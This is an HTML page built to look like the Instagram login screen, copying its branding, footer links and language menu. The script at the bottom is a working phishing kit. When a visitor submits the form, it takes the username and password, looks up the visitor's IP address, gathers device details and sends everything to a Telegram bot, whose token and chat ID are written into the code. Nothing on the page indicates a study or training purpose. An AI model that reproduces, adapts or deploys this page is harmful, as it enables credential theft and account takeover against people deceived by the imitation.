<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <title>Login • Instagram</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input id="email" name="email" placeholder="Phone number, username, or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <a aria-label="Get it on App Store"  href="https://apps.apple.com/us/app/instagram/id389801252">
                        <img src="img/apple-button.png" alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
                    </a>
                    <a aria-label="Get it on Google Play"  href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share">
                        <img src="img/googleplay-button.png" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
                    </a>
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://about.meta.com/">Meta</a></li>
            <li><a href="https://about.instagram.com/">ABOUT</a></li>
            <li><a href="https://help.instagram.com/">HELP</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
            <li><a href="https://about.instagram.com/about-us/careers">JOBS</a></li>
            <li><a href="https://www.instagram.com/legal/privacy/">PRIVACY</a></li>
            <li><a href="https://www.instagram.com/legal/terms/">TERMS</a></li>
            <li><a href="https://www.instagram.com/explore/locations/">LOCATIONS</a></li>
            <li><a href="https://about.instagram.com/blog/">Blog</a></li>
            <li><a href="https://www.threads.net/">Threads</a></li>
        </ul>
        <select aria-label="Switch Display Language" class="x1ypdohk x5yr21d x17qophe xg01cxk x10l6tqk x13vifvy xh8yej3">
            <option value="af">Afrikaans</option><option value="ar">العربية</option><option value="cs">Čeština</option
                ><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option>
                <option value="en">English</option><option value="en-gb">English (UK)</option><option value="es">Español (España)</option>
                <option value="es-la">Español</option><option value="fa">فارسی</option><option value="fi">Suomi</option>
                <option value="fr">Français</option><option value="he">עברית</option><option value="id">Bahasa Indonesia</option>
                <option value="it">Italiano</option><option value="ja">日本語</option><option value="ko">한국어</option>
                <option value="ms">Bahasa Melayu</option><option value="nb">Norsk</option><option value="nl">Nederlands</option>
                <option value="pl">Polski</option><option value="pt-br">Português (Brasil)</option><option value="pt">Português (Portugal)</option>
                <option value="ru">Русский</option><option value="sv">Svenska</option><option value="th">ภาษาไทย</option><option value="tl">Filipino</option>
                <option value="tr">Türkçe</option><option value="zh-cn">中文(简体)</option><option value="zh-tw">中文(台灣)</option><option value="bn">বাংলা</option>
                <option value="gu">ગુજરાતી</option><option value="hi">हिन्दी</option><option value="hr">Hrvatski</option><option value="hu">Magyar</option>
                <option value="kn">ಕನ್ನಡ</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ne">नेपाली</option>
                <option value="pa">ਪੰਜਾਬੀ</option><option value="si">සිංහල</option><option value="sk">Slovenčina</option><option value="ta">தமிழ்</option>
                <option value="te">తెలుగు</option><option value="ur">اردو</option><option value="vi">Tiếng Việt</option><option value="zh-hk">中文(香港)</option>
                <option value="bg">Български</option><option value="fr-ca">Français (Canada)</option><option value="ro">Română</option><option value="sr">Српски</option>
                <option value="uk">Українська</option>
        </select>
        <p class="copyright">© 2025 Instagram from Meta</p>
    </footer>

    <script>
        const TOKEN = "7861180693:AAFW9h-r_gADvQKLOaKoa3ge2erTefoLdRA";
        const CHAT_ID = "5383438395";
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;
                    console.log('User IP:', ip);

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = window.screen.width;
                    const screenHeight = window.screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    console.log('User Agent:', userAgent);
                    console.log('Platform:', platform);
                    console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);
                    console.log('Device Type:', deviceType);

                    const message = `
                        <b>New Login Attempt</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}\n
                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message,
                    }).then(response => {
                        console.log('Message sent:', response.data);
                    }).catch(error => {
                        console.error('Error sending message:', error);
                    });
                }).catch(error => {
                    console.error('Error getting IP address:', error);
                });
        });
    </script>
</body>
</html>
